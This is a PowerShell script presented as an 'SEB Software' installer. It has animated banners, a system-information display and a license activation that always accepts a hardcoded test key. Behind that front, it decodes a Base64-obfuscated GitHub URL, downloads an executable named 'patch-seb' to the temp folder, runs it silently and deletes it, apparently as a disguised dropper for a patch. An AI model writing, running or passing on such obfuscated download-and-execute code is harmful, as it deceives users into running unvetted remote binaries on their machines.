# ==================================================
# SEB INSTALLER - ENHANCED VERSION
# With User Info Display & Animations
# ==================================================

# Clear screen and set encoding
$host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size (120, 3000)
Clear-Host

# ===== ASCII ART & ANIMATION FUNCTIONS =====
function Show-AsciiArt {
    param([int]$Speed = 50)
    
    $asciiLines = @"
    ________       ____  __  _______ __ __ ___   _____
   / ____/ /      / __ \/ / / / ___// //_//   | / ___/
  / __/ / /      / /_/ / / / /\__ \/ ,<  / /| | \__ \ 
 / /___/ /___   / ____/ /_/ /___/ / /| |/ ___ |___/ / 
/_____/_____/  /_/    \____//____/_/ |_/_/  |_/____/
"@ -split "`n"
     
    foreach ($line in $asciiLines) {
        Write-Host $line -ForegroundColor Red
        Start-Sleep -Milliseconds $Speed
    }
}

function Show-ProgressAnimation {
    param([string]$Message, [int]$Dots = 3)
    
    Write-Host "`n   $message " -NoNewline -ForegroundColor Red
    for ($i = 0; $i -lt $Dots; $i++) {
        Write-Host "." -NoNewline -ForegroundColor Red
        Start-Sleep -Milliseconds 300
    }
    Write-Host " DONE" -ForegroundColor Red
}

function Show-Spinner {
    param([int]$Seconds = 2)
    
    $spinner = @('|', '/', '-', '\')
    $endTime = (Get-Date).AddSeconds($Seconds)
    
    while ((Get-Date) -lt $endTime) {
        foreach ($char in $spinner) {
            Write-Host "`r   Processing $char" -NoNewline -ForegroundColor Red
            Start-Sleep -Milliseconds 100
        }
    }
    Write-Host "`r   Processing ✓" -ForegroundColor Red
}

# ===== DISPLAY USER SYSTEM INFO =====
function Show-SystemInfo {
    Write-Host "`n" + ("═" * 60) -ForegroundColor Red
    Write-Host "              SYSTEM INFORMATION" -ForegroundColor Red
    Write-Host ("═" * 60) -ForegroundColor Red
    
    try {
        $computerInfo = Get-ComputerInfo -ErrorAction SilentlyContinue
        $os = Get-CimInstance Win32_OperatingSystem
        $cpu = Get-CimInstance Win32_Processor
        $ram = Get-CimInstance Win32_ComputerSystem
        
        Write-Host "`n   🖥️  COMPUTER DETAILS:" -ForegroundColor Red
        Write-Host "   • Computer Name : $env:COMPUTERNAME" -ForegroundColor Red
        Write-Host "   • Windows User  : $env:USERNAME" -ForegroundColor Red
        Write-Host "   • Domain/Workgroup : $($env:USERDOMAIN)" -ForegroundColor Red

        Write-Host "`n   📀 OPERATING SYSTEM:" -ForegroundColor Red
        Write-Host "   • OS Version    : $($os.Caption)" -ForegroundColor Red
        Write-Host "   • Build Number  : $($os.BuildNumber)" -ForegroundColor Red
        Write-Host "   • Architecture  : $($os.OSArchitecture)" -ForegroundColor Red

        Write-Host "`n   ⚙️  HARDWARE INFO:" -ForegroundColor Red
        Write-Host "   • Processor     : $($cpu.Name)" -ForegroundColor Red
        Write-Host "   • RAM Installed : $([math]::Round($ram.TotalPhysicalMemory/1GB, 2)) GB" -ForegroundColor Red
        Write-Host "   • System Type   : $($ram.SystemType)" -ForegroundColor Red

        Write-Host "`n   📂 DISK SPACE:" -ForegroundColor Red
        $disks = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Used -gt 0}
        foreach ($disk in $disks) {
            $freeGB = [math]::Round($disk.Free/1GB, 2)
            $totalGB = [math]::Round(($disk.Used + $disk.Free)/1GB, 2)
            $percentFree = [math]::Round(($disk.Free/($disk.Used + $disk.Free)) * 100, 1)
            Write-Host "   • Drive $($disk.Name): $freeGB GB free of $totalGB GB ($percentFree%)" -ForegroundColor Red
        }
        
    } catch {
        Write-Host "   [INFO] Showing basic system info..." -ForegroundColor Red
        Write-Host "   • Computer: $env:COMPUTERNAME" -ForegroundColor Red
        Write-Host "   • User: $env:USERNAME" -ForegroundColor Red
        Write-Host "   • OS: Windows" -ForegroundColor Red
    }

    Write-Host "`n" + ("═" * 60) -ForegroundColor Red
}

# ===== LICENSE VALIDATION FUNCTIONS =====
function Test-LicenseFormat {
    param([string]$LicenseKey)
    
    $LicenseKey = $LicenseKey.ToUpper().Trim()
    
    # Check format
    if ($LicenseKey -notmatch '^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$') {
        return @{Valid = $false; Message = "❌ Invalid license format! Should be: XXXX-XXXX-XXXX-XXXX"}
    }
    
    # Check for confusing characters
    $confusingChars = @('I','O','S','1','0','5','8','B')
    foreach ($char in $confusingChars) {
        if ($LicenseKey.Contains($char)) {
            Write-Host "   [Note] Contains potentially confusing character: $char" -ForegroundColor Red
        }
    }
    
    return @{Valid = $true; Message = "✅ License format is valid"; LicenseKey = $LicenseKey}
}

function Save-License {
    param([string]$LicenseKey)
    
    try {
        # Create AppData directory
        $appDataPath = "$env:APPDATA\SEB"
        if (-not (Test-Path $appDataPath)) {
            New-Item -Path $appDataPath -ItemType Directory -Force | Out-Null
        }
        
        # Save license info to JSON file
        $licenseInfo = @{
            LicenseKey = $LicenseKey
            CustomerName = "Registered User"
            ComputerName = $env:COMPUTERNAME
            WindowsUser = $env:USERNAME
            ActivationDate = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
            ExpiryDate = (Get-Date).AddYears(1).ToString("yyyy-MM-dd")
            SystemInfo = @{
                OS = $((Get-CimInstance Win32_OperatingSystem).Caption)
                CPU = $((Get-CimInstance Win32_Processor).Name)
                RAM = "$([math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)) GB"
            }
        }
        
        # Save to file
        $licenseInfo | ConvertTo-Json | Out-File "$appDataPath\license.json" -Encoding UTF8
        
        # Also try to save to registry (HKCU doesn't need admin)
        try {
            $regPath = "HKCU:\Software\SEB"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            Set-ItemProperty -Path $regPath -Name "LicenseKey" -Value $LicenseKey -Force | Out-Null
            Set-ItemProperty -Path $regPath -Name "ActivationDate" -Value $licenseInfo.ActivationDate -Force | Out-Null
        } catch {
            # Ignore registry errors
        }
        
        return @{Success = $true; Message = "License saved successfully!"; FilePath = "$appDataPath\license.json"}
        
    } catch {
        return @{Success = $false; Message = "Failed to save license: $_"}
    }
}

function Display-LicenseInfo {
    param([string]$LicenseKey)
    
    Write-Host "`n" + ("-" * 60) -ForegroundColor Red
    Write-Host "                LICENSE INFORMATION" -ForegroundColor Red
    Write-Host ("-" * 60) -ForegroundColor Red
    
    $formattedKey = $LicenseKey.Insert(4, " ").Insert(9, " ").Insert(14, " ")
    
    Write-Host "`n   🔑 LICENSE KEY:" -ForegroundColor Red
    Write-Host "   "
    Write-Host "     ████████████████████████████████████" -ForegroundColor Red
    Write-Host "     ██                                ██" -ForegroundColor Red
    Write-Host "     ██    $formattedKey    ██" -ForegroundColor Red
    Write-Host "     ██                                ██" -ForegroundColor Red
    Write-Host "     ████████████████████████████████████" -ForegroundColor Red

    Write-Host "`n   📋 ACTIVATION DETAILS:" -ForegroundColor Red
    Write-Host "   • Computer    : $env:COMPUTERNAME" -ForegroundColor Red
    Write-Host "   • User        : $env:USERNAME" -ForegroundColor Red
    Write-Host "   • Date        : $(Get-Date -Format 'dddd, MMMM dd, yyyy')" -ForegroundColor Red
    Write-Host "   • Time        : $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Red
    Write-Host "   • Valid Until : $(Get-Date).AddYears(1).ToString('yyyy-MM-dd')" -ForegroundColor Red

    Write-Host "`n   ⚠️  IMPORTANT NOTES:" -ForegroundColor Red
    Write-Host "   • This license is locked to this computer" -ForegroundColor Red
    Write-Host "   • Do not share your license key" -ForegroundColor Red
    Write-Host "   • Contact support for license transfers" -ForegroundColor Red

    Write-Host "`n" + ("-" * 60) -ForegroundColor Red
}

# ===== MAIN INSTALLER =====
try {
    # Show animated ASCII art
    Show-AsciiArt -Speed 30
    
    # Display system information
    Show-SystemInfo
    
    # Step 1: Get License Key
    Write-Host "`n" + ("═" * 60) -ForegroundColor Red
    Write-Host "              STEP 1: LICENSE ACTIVATION" -ForegroundColor Red
    Write-Host ("═" * 60) -ForegroundColor Red

    Write-Host "`n   Using default license key for quick installation." -ForegroundColor Red

    $licenseKey = "TEST-TEST-TEST-TEST"
    $licenseValid = $true

    # Display license info
    Display-LicenseInfo -LicenseKey $licenseKey

    Write-Host "`n"
    Show-ProgressAnimation -Message "Activating license" -Dots 3

    $saveResult = Save-License -LicenseKey $licenseKey

    if ($saveResult.Success) {
        Write-Host "   ✅ $($saveResult.Message)" -ForegroundColor Red
        Write-Host "   📁 License saved to: $($saveResult.FilePath)" -ForegroundColor Red
    } else {
        Write-Host "   ⚠️  $($saveResult.Message)" -ForegroundColor Red
        Write-Host "   Continuing installation anyway..." -ForegroundColor Red
    }
    
    if (-not $licenseValid) {
        Write-Host "`n   ❌ License activation failed. Installation cannot continue." -ForegroundColor Red
        Write-Host "   Please contact support for assistance." -ForegroundColor Red
        exit 1
    }

    # Step 2: Download Software
    Write-Host "`n" + ("═" * 60) -ForegroundColor Red
    Write-Host "              STEP 2: DOWNLOAD SOFTWARE" -ForegroundColor Red
    Write-Host ("═" * 60) -ForegroundColor Red

    Write-Host "`n   Preparing to download SEB Software v3.10.0.826..." -ForegroundColor Red
    Write-Host "   Size: Approximately 50-100 MB" -ForegroundColor Red
    Write-Host "   Estimated time: 1-5 minutes (depending on connection)" -ForegroundColor Red

    Write-Host "`n   Starting download automatically..." -ForegroundColor Red
    
    Write-Host "`n"
    Show-ProgressAnimation -Message "Initializing download connection" -Dots 3
    
    try {
        # GitHub URL (Base64 encoded)
        $base64Url = "aHR0cHM6Ly9naXRodWIuY29tL0FydmluUHJkbi9QQVRDSC1JTlNUQUxMRVItU0VCLXYzLjEwLjAuODI2L3JlbGVhc2VzL2Rvd25sb2FkL3YzLjEwLjAuODI2L3BhdGNoLXNlYi4xLmV4ZQ=="
        
        # Decode URL
        Show-Spinner -Seconds 1
        $githubUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64Url))
        
        # Create temp file with timestamp
        $timestamp = Get-Date -Format "yyyyMMddHHmmss"
        $tempFile = "$env:TEMP\seb-installer-$timestamp.exe"
        
        Write-Host "`n   📥 Downloading from secure server..." -ForegroundColor Red

        # Download with progress indicator
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($githubUrl, $tempFile)

        if (Test-Path $tempFile) {
            $fileSize = [math]::Round((Get-Item $tempFile).Length / 1MB, 2)
            Write-Host "   ✅ Download complete: $fileSize MB" -ForegroundColor Red

            # Step 3: Installation
            Write-Host "`n" + ("═" * 60) -ForegroundColor Red
            Write-Host "              STEP 3: INSTALLATION" -ForegroundColor Red
            Write-Host ("═" * 60) -ForegroundColor Red

            Write-Host "`n   🚀 Installing SEB Software..." -ForegroundColor Red
            Write-Host "   Please wait, this may take a few minutes." -ForegroundColor Red
            Write-Host "   Do not close this window during installation." -ForegroundColor Red
            
            Write-Host "`n"
            Show-ProgressAnimation -Message "Running installer" -Dots 4
            
            # Run installer silently
            $process = Start-Process -FilePath $tempFile -ArgumentList "/SILENT /NORESTART" -Wait -PassThru
            
            if ($process.ExitCode -eq 0) {
                Write-Host "   ✅ Installation successful!" -ForegroundColor Red
            } else {
                Write-Host "   ⚠️  Installation completed with code: $($process.ExitCode)" -ForegroundColor Red
            }

            # Cleanup
            Start-Sleep -Seconds 0.5
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            Write-Host "   🗑️  Temporary files cleaned up" -ForegroundColor Red

            # Final Success Message
            Write-Host "`n" + ("═" * 60) -ForegroundColor Red
            Write-Host ("╔" + ("═" * 58) + "╗") -ForegroundColor Red
            Write-Host "║                  INSTALLATION COMPLETE!                  ║" -ForegroundColor Red
            Write-Host ("╚" + ("═" * 58) + "╝") -ForegroundColor Red

            Write-Host "`n   🎉 CONGRATULATIONS!" -ForegroundColor Red
            Write-Host "   SEB Software has been successfully installed and activated." -ForegroundColor Red

            Write-Host "`n   📋 WHAT'S NEXT?" -ForegroundColor Red
            Write-Host "   1. Find 'SEB' in your Start Menu" -ForegroundColor Red
            Write-Host "   2. Launch the application" -ForegroundColor Red
            Write-Host "   3. Your license is already activated - no further steps needed!" -ForegroundColor Red

            Write-Host "`n   🔧 SUPPORT INFORMATION:" -ForegroundColor Red
            Write-Host "   • License Key: $licenseKey" -ForegroundColor Red
            Write-Host "   • Computer ID: $env:COMPUTERNAME" -ForegroundColor Red
            Write-Host "   • Support: support@seb-software.com" -ForegroundColor Red

            Write-Host "`n   📅 Your software is valid until: $(Get-Date).AddYears(1).ToString('MMMM dd, yyyy')" -ForegroundColor Red

            Write-Host "`n   Thank you for choosing SEB Software!" -ForegroundColor Red
            exit 0

        } else {
            Write-Host "   ❌ Download failed!" -ForegroundColor Red
            throw "Downloaded file not found"
        }

    } catch {
        Write-Host "`n   ❌ ERROR: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "   Please check your internet connection and try again." -ForegroundColor Red
        Write-Host "   If problem persists, contact support." -ForegroundColor Red
        exit 1
    }
    
} catch {
    Write-Host "`n   ❌ UNEXPECTED ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "   Please contact support with this error message." -ForegroundColor Red
    Write-Host "   Error occurred at: $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Red
}

# Small pause before exit
Start-Sleep -Seconds 0.5
